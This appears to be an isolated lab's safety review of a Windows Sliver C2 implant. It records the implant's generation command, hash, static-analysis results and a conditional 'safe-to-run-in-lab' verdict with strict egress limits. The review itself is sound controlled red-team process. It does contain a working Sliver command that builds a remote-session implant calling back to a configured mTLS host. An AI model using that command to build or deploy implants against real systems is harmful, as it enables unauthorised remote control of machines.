# Generated Windows mTLS session implant review

- Generator: official Sliver v1.7.3 server, commit
  `3bbaf805104dcc4a75414ee0084e8de50702cad4`
- Generation command: `generate --mtls 192.168.1.50:31337 --os windows
  --arch amd64 --format exe --name WIN-RAW-SESSION`
- Size: 35,167,232 bytes
- SHA-256:
  `93687267b75b076e77e7e199a0a5adefd1727837075363e0f260ac95f612648e`
- Configured runtime destination: `mtls://192.168.1.50:31337`

## Mechanical triage

The adjacent `poc-review.json` is fresh `safety/poc-triage.py` output produced
on static-analysis VM 110 before execution. It returned
`NEEDS-HUMAN-REVIEW` solely because this is a 35 MB compiled PE with measured
entropy 6.14. It did not report a hard-coded public endpoint, credential-file
access string, install hook, persistence command, destructive command, or
second-stage download expression. A scanner result is not clearance.

## Static and source-correspondence review

VM 110 received the PE from Kali `192.168.1.50` for static analysis only. The
Kali generation artifact and VM 110 copy hashes matched. `file` identified a
PE32+ x86-64 Windows GUI executable with eight conventional Go PE sections;
`objdump` showed only `kernel32.dll` in the static import table. The file was
never launched, loaded, emulated, or submitted to an external service on VM
110.

The generated source retained by the isolated Sliver server was read without
execution. Its transport generator contains one endpoint only:
`mtls://192.168.1.50:31337`. The reviewed source paths in the parent
`poc-review.md` account for the session, SOCKS, execute-assembly, and mTLS
behavior invoked in the bounded flow. String extraction did not reveal the
obfuscated endpoint, which is expected after Sliver's default garbling and is
why generated-source correspondence and the preventive egress guard are
required.

## Verdict

**`safe-to-run-in-lab`**, only on Windows VM 104 after rollback to
`win_verify_baseline`, with target/Kali egress restricted to loopback and
`192.168.1.0/24`, full packet capture active, and exact hash verification after
delivery. The only permitted C2 destination is `192.168.1.50:31337`; the only
permitted tunneled request is the fixed Kali marker service at
`192.168.1.50:18084`. No execution is permitted on VM 102, VM 108, VM 109, VM
110, or any other host.
